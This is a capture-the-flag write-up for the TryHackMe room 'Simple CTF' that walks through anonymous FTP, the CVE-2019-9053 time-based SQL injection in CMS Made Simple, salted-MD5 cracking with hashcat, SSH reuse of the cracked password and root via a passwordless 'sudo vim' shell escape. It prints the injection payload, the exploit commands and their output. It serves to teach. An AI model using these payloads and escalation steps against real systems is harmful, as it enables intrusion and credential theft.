---
title: "Simple CTF"
description: "Three services, one abandoned FTP drop, and a CMS one patch behind. A leaked note tells you the developer reused his system password, CVE-2019-9053 recovers the admin hash through time-based blind SQL injection, and a passwordless sudo rule for vim hands over root."
difficulty: "Easy"
tags: ["FTP", "Anonymous Access", "CMS Made Simple", "CVE-2019-9053", "SQL Injection", "Hash Cracking", "Sudo", "Vim", "Privilege Escalation"]
date: "2026-04-04"
---

## Overview

Simple CTF is a beginner room built around one very common real-world situation: a forgotten FTP share, a CMS nobody has patched, and a developer who reused a password.

Nothing here is clever. The FTP server allows anonymous logins and contains a note from a colleague scolding "Mitch" for using the same weak password for the application and the system account. The website root is the stock Apache page, so the room makes you enumerate before it gives anything away. Behind `/simple` sits **CMS Made Simple 2.2.8**, one version behind the release that fixed **CVE-2019-9053** — an unauthenticated SQL injection that leaks the administrator's salt and password hash one character at a time through response timing. The hash cracks to `secret`, and `mitch` has reused it for SSH.

Privilege escalation is a single line of `sudo -l`: `mitch` may run `/usr/bin/vim` as root without a password. Vim can execute shell commands, so "run vim as root" and "run any command as root" are the same permission.

The value of the room is the ordering. The FTP note does not give you a foothold, it gives you a *hypothesis* — that the application password and the system password are the same — which only pays off after the SQL injection has recovered the password. Recognising that the two unrelated-looking findings are actually one chain is the whole exercise.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** boot2root
- **Operating System:** Ubuntu 16.04.6 LTS
- **Services:** vsftpd 3.0.3 (21), Apache 2.4.18 (80), OpenSSH 7.2p2 (2222)
- **Skills Learned:** Anonymous FTP enumeration, directory brute-forcing, CMS fingerprinting, reading an exploit before running it, time-based blind SQL injection, salted MD5 cracking with the right hashcat mode, `sudo` abuse through a GTFOBin

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.48.152.201
```

```text
# Nmap 7.98 scan initiated Sat Apr  4 22:09:07 2026 as: /usr/lib/nmap/nmap -sV -sC -oN nmap.txt 10.48.152.201
Nmap scan report for 10.48.152.201
Host is up (0.066s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
|      FTP server status:
|      Connected to ::ffff:192.168.253.107
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

![Nmap enumeration of the three exposed services](/assets/screenshots/simplectf/nmap.png)

Three open ports and one significantly unusual choice:

| Port | Service | Version | Comment |
|------|---------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 | **Anonymous login allowed** |
| 80/tcp | HTTP | Apache 2.4.18 | Stock "It works!" page |
| 2222/tcp | SSH | OpenSSH 7.2p2 | SSH moved off port 22 |

Two details in that output are worth stopping on.

**SSH is on 2222.** Port 22 is not open at all. A scan limited to the default port list, or a habit of typing `ssh user@host` without `-p`, would miss the service that eventually provides the foothold. This is not security — moving a service to a non-standard port stops nothing — but it does defeat assumptions, and assumptions are what beginners rely on most.

**Anonymous FTP is a finding, not a hint.** `FTP code 230` on an anonymous login means the server granted a session to a user with no credentials. Whether it matters depends entirely on what the share contains.

One more thing: the `ftp-anon` script also reports `Can't get directory listing: TIMEOUT`, which looks like a dead end. It is not. The anonymous root has a `pub` directory, and the script's passive-mode listing simply timed out before reaching it. Getting a timeout from a scanner is not the same as getting a negative result, and this is a good example of why the initial scan output gets verified by hand.

### The robots.txt red herring

Nmap picked up `robots.txt` with two disallowed entries: `/` and `/openemr-5_0_1_3`.

That second entry is tempting. It names a product and a version — OpenEMR 5.0.1.3 — which is the kind of thing that starts a whole detour into OpenEMR vulnerabilities. Fetching it:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://10.48.152.201/openemr-5_0_1_3
```

```text
404
```

It does not exist. The file itself is the default `robots.txt` shipped with CUPS, the printing system, with one line appended. It is a decoy: a plausible-looking path, on a server that has never had OpenEMR installed. Rooms do this deliberately, and real engagements do it accidentally — a stale entry in a config file sends people chasing software that was removed years ago.

The lesson is not "ignore robots.txt". It is "verify what robots.txt claims before you spend an hour on it".

### Web enumeration

The web root is the Ubuntu Apache default page:

![Stock Apache default page at the web root](/assets/screenshots/simplectf/apache-default.png)

Nothing on it links anywhere, which means the application has to be found rather than browsed to:

```bash
ffuf -u http://10.48.152.201/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -fc 200
```

```text
simple                  [Status: 301, Size: 317, Words: 20, Lines: 10]
```

![Directory fuzzing finds the /simple directory](/assets/screenshots/simplectf/ffuf.png)

`-fc 200` filters out responses that return the default page, which keeps the output to the one directory that actually differs from the wildcard behaviour. `gobuster` works just as well here; the room does not care which tool finds `/simple`.

### Browsing the CMS

`http://10.48.152.201/simple/` is a freshly installed CMS Made Simple site, and the footer states the version outright:

![CMS Made Simple installed at /simple](/assets/screenshots/simplectf/cms-made-simple.png)

```text
CMS Made Simple 2.2.8
```

That single number decides the rest of the room. Version strings in footers, generator meta tags, and default readme files are the cheapest fingerprint available, and CMS platforms put them in front of the world by design.

```bash
searchsploit "CMS Made Simple"
```

```text
CMS Made Simple < 2.2.10 - SQL Injection
```

![SearchSploit results for CMS Made Simple](/assets/screenshots/simplectf/searchsploit.png)

The installed version is 2.2.8, which is below 2.2.10, so it is in range for **CVE-2019-9053**.

> A note on the version: this box runs **2.2.8**, not 2.2.9. The "<= 2.2.9" figure that appears in most writeups — including my own notes for this room — is the *vulnerable range* from the CVE, not the installed version. Both are exploitable; only one is a fingerprint.

## The Vulnerability — CVE-2019-9053

The bug is an unauthenticated SQL injection in the News module's `m1_idlist` parameter:

```text
/simple/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=<payload>
```

CMS Made Simple passes that parameter into a query without adequate escaping, and the query's result is never displayed. That combination rules out a normal union-based injection — there is nothing on the page to read the data back from. So the exploit uses the database itself as a timing device.

The payload the public exploit sends is:

```text
a,b,1,5))+and+(select+sleep(1)+from+cms_siteprefs
  +where+sitepref_value+like+0x<hex>25
  +and+sitepref_name+like+0x736974656d61736b)+--+
```

Decoded, that is:

```sql
a,b,1,5)) and (select sleep(1) from cms_siteprefs
  where sitepref_value like '<prefix>%'
  and sitepref_name like 'sitemask') -- 
```

Every piece matters:

- **`a,b,1,5))`** closes the list and the parenthesised expression the application left open, so the injected `and (...)` becomes part of a valid query instead of a syntax error.
- **`+`** is a URL-encoded space. The payload is pasted into the query string, so every space has to survive the trip.
- **`--+`** comments out the remainder of the original query.
- **`0x<hex>`** is a hex literal rather than a quoted string. Hex avoids the quote characters that the application's escaping is (partly) catching, and it is why the payload can compare strings at all.
- **`25`** appended to the hex is the ASCII code for `%`. So `like 0x616425` is `like 'ad%'` — a *prefix* match against everything recovered so far plus one candidate character.
- **`sleep(1)`** executes only when the `where` clause matches. If the response takes at least a second longer than usual, the guess was correct.

Recovering one string therefore means: for each character position, try every character in the dictionary, and keep the one that makes the server sleep. A 16-character salt is 16 × ~70 requests, which is slow but entirely reliable — and it is why the exploit's own instructions tell you to tune the `TIME` variable, since `sleep(1)` is easy to lose in network jitter and a false positive costs you the whole string.

The exploit queries three things from the database: the `sitemask` site preference (the salt used for password hashing), the administrator's username, and the administrator's email. It then pulls the stored password hash and, optionally, cracks it.

## Exploitation

### Obtaining and reading the exploit

```bash
searchsploit -m 46635
```

or, if the local copy of ExploitDB is not installed:

```bash
wget https://www.exploit-db.com/download/46635 -O exploit.py
```

The script is authored by Daniele Scanu of Certimeter Group, dated March 2019, and targets "CMS Made Simple <= 2.2.9". Reading it before running it is worth the five minutes: it shows you the dictionary of characters it tries, the three dumps it performs (`dump_salt`, `dump_username`, `dump_email`, then `dump_password`), and the `TIME = 1` threshold. Everything the tool does is visible, which is the difference between using an exploit and trusting one.

### The Python 2 problem

The script is Python 2, and not subtly:

```python
print colored("[*] Now try to crack password")
```

Running it with `python3` fails before it can do anything:

```bash
python3 -m py_compile exploit.py
```

```text
File "exploit.py", line 183
    print colored("[*] Now try to crack password")
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

That is a parse error, so the whole file is rejected — you do not get as far as the injection. Two ways out:

```bash
# Option 1: run it with the interpreter it was written for
python2 exploit.py -u http://10.48.152.201/simple/ --crack -w /usr/share/wordlists/rockyou.txt

# Option 2: fix the one line and use python3
sed -i 's/print colored(\(.*\))/print(colored(\1))/' exploit.py
pip install requests termcolor
python3 exploit.py -u http://10.48.152.201/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

Both `--crack` and `-c` work — the option is declared as `('-c', '--crack', ...)` — and `-w` supplies the wordlist used by the built-in cracker.

### Running it

```bash
python2 exploit.py -u http://10.48.152.201/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

```text
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

![Credential extraction through the time-based injection](/assets/screenshots/simplectf/credential-extraction.png)

Expect this to take a while. Every character is a fresh round of requests with a one-second delay on the successful guess, so the run is measured in tens of minutes, not seconds. The output is redrawn on every attempt, which makes it look like it is spinning its wheels when it is actually progressing one character at a time.

### Cracking the hash, properly

If you skip `--crack` and take the hash elsewhere, the mode matters more than the wordlist:

```bash
hashcat -m 20 -a 0 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
```

```text
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

![Hashcat recovers the password from the salted MD5 hash](/assets/screenshots/simplectf/hashcat-cracked.png)

`-m 20` is **md5($salt.$pass)** — the salt is prepended to the password before hashing. `-m 10` is md5($pass.$salt), the other order, and produces no match on the same hash. Guessing the wrong one wastes the entire run and looks like a "strong password", which is a misleading conclusion: the password is `secret` and would fall to any wordlist in under a second with the right mode.

You can confirm which order the application uses without any cracking at all:

```bash
printf '1dac0d92e9fa6bb2secret' | md5sum
```

```text
0c01f4468bd75d7a84c7eb73846e8d96  -
```

There is the stored hash, produced on your own machine from the extracted salt and the guessed password. Cross-checking a candidate this way before committing to a long crack is a habit worth having.

## Initial Access

The CMS administrator account is `mitch`, and the note on the FTP server claimed he reused the same password for the system account. Testing that hypothesis:

```bash
ssh -p 2222 mitch@10.48.152.201
```

```text
mitch@10.48.152.201's password: secret
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
```

![Logging in over SSH as mitch on port 2222](/assets/screenshots/simplectf/ssh-login.png)

The `-p 2222` is not optional. Omitting it connects to port 22, which nothing is listening on, and the client sits there until it times out — a failure that looks like a broken network when it is just the wrong port.

```bash
cat ~/user.txt
```

```text
G00d j0b, keep up!
```

![The user flag in Mitch's home directory](/assets/screenshots/simplectf/user-flag.png)

One more piece of context is worth collecting:

```bash
ls /home
```

```text
mitch  sunbath
```

There is a second human account, `sunbath`. It is not needed for this box — the `sudo` misconfiguration on `mitch` is the intended route — but on a real host it would be the start of horizontal movement: a second account means a second set of files, credentials, and probably the same weak password.

## Privilege Escalation

The first check on any Linux host is what the current user is allowed to do:

```bash
sudo -l
```

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

![sudo -l reveals a passwordless rule for vim](/assets/screenshots/simplectf/sudo-l.png)

That is a complete privilege escalation, disguised as an editor permission. Vim is not only a text editor: from normal mode, `:!command` runs a shell command, and because the vim process is running as root, so is the command. `NOPASSWD` removes the last obstacle.

The one-liner version avoids needing an interactive session:

```bash
sudo vim -c ':!/bin/sh'
```

Or interactively, which is how most people do it on this box:

```bash
sudo vim
```

then inside vim:

```vim
:!/bin/sh
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

![Spawning a root shell from inside the sudo vim session](/assets/screenshots/simplectf/vim-root-access.png)

```bash
cat /root/root.txt
```

```text
W3ll d0n3. You made it!
```

![The root flag](/assets/screenshots/simplectf/root-flag.png)

This is the textbook GTFOBins pattern: a binary that is safe to *run* is not safe to run *as root* if it can be told to run something else. `vim`, `less`, `find`, `awk`, `python`, `tar` and dozens of others all qualify. The fix is not to remove vim — it is to never grant a full-featured interpreter through sudo when a narrow wrapper script would do.

### An alternative route worth knowing

Because the cracked password is also the CMS administrator password, the same credentials log in at `http://10.48.152.201/simple/admin/`. From there, CMS Made Simple's admin interface can execute PHP — the theme and template editors write files that the web server then serves, and User Defined Tags are evaluated as PHP by design. That route is slower than SSH and leaves the CMS configured badly, but on a host where SSH had been firewalled off it would be the only way in. It also explains why the FTP note's claim about password reuse is important: one credential, two entirely separate attack surfaces.

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User | `G00d j0b, keep up!` | `/home/mitch/user.txt` |
| Root | `W3ll d0n3. You made it!` | `/root/root.txt` |

These are static strings for this room image, corroborated by multiple independent walkthroughs. The salt and hash values (`1dac0d92e9fa6bb2` / `0c01f4468bd75d7a84c7eb73846e8d96`) also appear to be fixed, but treat them as incidental — if you get a different salt, the technique is unchanged and only the cracking step differs.

## Commands Used

```bash
# --- Enumeration ---
nmap -sV -sC -oN nmap.txt 10.48.152.201
curl -s -o /dev/null -w "%{http_code}\n" http://10.48.152.201/openemr-5_0_1_3   # 404, a decoy
ffuf -u http://10.48.152.201/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 200

# --- Anonymous FTP ---
ftp 10.48.152.201            # anonymous / blank password
ls
cd pub
ls
get ForMitch.txt
bye
cat ForMitch.txt

# --- CMS fingerprint and exploit research ---
curl -s http://10.48.152.201/simple/ | grep -i "cms made simple"
searchsploit "CMS Made Simple"
searchsploit -m 46635

# --- Exploitation ---
python3 -m py_compile exploit.py            # fails: Python 2 print statement
python2 exploit.py -u http://10.48.152.201/simple/ --crack -w /usr/share/wordlists/rockyou.txt

# --- Cracking (if not using --crack) ---
hashcat -m 20 -a 0 <hash>:<salt> /usr/share/wordlists/rockyou.txt
printf '<salt>secret' | md5sum             # verify the candidate by hand

# --- Foothold ---
ssh -p 2222 mitch@10.48.152.201
cat ~/user.txt
ls /home

# --- Privilege escalation ---
sudo -l                                    # (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
# or: sudo vim   then   :!/bin/sh
cat /root/root.txt
```

## Lessons Learned

- **Anonymous FTP is a finding even when it looks empty.** The nmap script reported `Can't get directory listing: TIMEOUT`, which reads like a dead end. Listing `pub` by hand took one command and produced the note that shaped the rest of the box. A scanner's failure to enumerate is not the same as an absence of content.
- **A leaked note is a hypothesis, not a credential.** `ForMitch.txt` gave no password — it gave three facts: the username is probably `mitch`, the application password equals the system password, and it is weak enough to crack quickly. That only became actionable after the SQL injection produced the actual hash. Holding a hint until something can test it is the skill.
- **Move past decoys deliberately.** The `robots.txt` entry for `/openemr-5_0_1_3` is pure bait — a plausible product with a plausible version that returns 404. Checking it cost one `curl`; believing it would have cost an hour of OpenEMR research.
- **Version fingerprints decide exploitation.** The footer said 2.2.8; `searchsploit` said "less than 2.2.10". Two lookups and the CVE was known. Skipping that step means guessing, and guessing is how people end up running an authenticated exploit against an unauthenticated bug.
- **Read the exploit, then run it.** The script is short: a character dictionary, a `TIME` variable, four dump functions and a cracking loop. Reading it explained why the injection is time-based, why it needs the `TIME` tuning, and why it takes so long. It also explained the failure mode — the leftover Python 2 `print` — before the error message did.
- **A syntax error is not a broken target.** `python3 exploit.py` fails at parse time, which is a property of the file, not of the vulnerable application. Modern Kali defaults to `python3`, so half the exploit scripts on ExploitDB need either `python2` or a one-line fix before they will even start.
- **Hash mode is part of the hash.** `-m 20` (salt prepended) cracked this in a second; `-m 10` (salt appended) cracks nothing. Concluding "the password is strong" from a run with the wrong mode is worse than not cracking at all, because it closes off a path that was open.
- **Verify a candidate before waiting on a wordlist.** `printf '<salt>secret' | md5sum` reproduced the stored hash instantly. Understanding the hashing scheme is often faster than brute-force, and it always tells you whether your assumptions are right.
- **Non-standard ports hide real services.** SSH on 2222 is the reason this box has three findings instead of two. Scanning all 65535 ports costs a minute; assuming the default 1000 costs the foothold.
- **`sudo` on an interpreter is root.** `/usr/bin/vim` through `NOPASSWD` is not a text editing permission, it is unrestricted root command execution. The same applies to `less`, `find`, `awk`, `python`, `tar` and the rest of the GTFOBins list, and it is the single most common privilege escalation on beginner Linux boxes.
- **One credential, many doors.** The same password opened SSH and the CMS admin panel. Any credential recovered during an engagement should be tried against every service it could plausibly belong to, not just the one where it was found.

## References

- [TryHackMe — Simple CTF](https://tryhackme.com/room/easyctf)
- [ExploitDB 46635 — CMS Made Simple < 2.2.10 SQL Injection](https://www.exploit-db.com/exploits/46635)
- [NVD — CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- [CMS Made Simple security releases](https://www.cmsmadesimple.org/)
- [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/)
- [ImperialX1104 — Simple CTF writeup](https://github.com/ImperialX1104/Simple-CTF-Writeup)
- [Jasper Alblas — TryHackMe: Simple CTF walkthrough](https://www.jalblas.com/blog/tryhackme-simple-ctf-walkthrough/)
- [The Hydra's Head — Simple CTF writeup](https://hydrashead.red/posts/thm-simple-ctf/)

*Screenshots are from the ImperialX1104 writeup linked above, credited because no captures were kept in the original room folder.*
